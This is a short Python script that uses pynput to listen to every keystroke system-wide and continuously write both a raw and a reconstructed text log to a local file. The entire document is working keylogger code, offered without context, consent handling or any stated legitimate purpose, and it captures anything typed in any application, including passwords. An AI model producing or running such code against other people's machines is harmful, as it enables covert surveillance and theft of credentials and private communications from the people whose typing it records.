from pynput.keyboard import Listener, Key

full_input_log = []
cleaned_input_log = []

def on_press(key):
    global full_input_log, cleaned_input_log
    
    # Record full input with special keys
    full_input_log.append(str(key))
    
    try:
        # For regular keys (letters, numbers, symbols)
        cleaned_input_log.append(key.char)
    except AttributeError:
        # Handle special keys
        if key == Key.space:
            cleaned_input_log.append(' ')  # Add space for Key.space
        elif key == Key.enter:
            cleaned_input_log.append('\n')  # Add newline for Key.enter
        elif key == Key.backspace:
            if cleaned_input_log:
                cleaned_input_log.pop()  # Remove the last character for backspace
        # Ignore other special keys

    # Write both logs to the file
    with open('log', 'w') as f:
        # Write full inputs
        f.write("FULL INPUTS:\n")
        f.write(''.join(full_input_log) + "\n\n")
        
        # Write cleaned input (letters, numbers, symbols only)
        f.write("CLEANED INPUTS:\n")
        f.write(''.join(cleaned_input_log))

with Listener(on_press=on_press) as listener:
    listener.join()
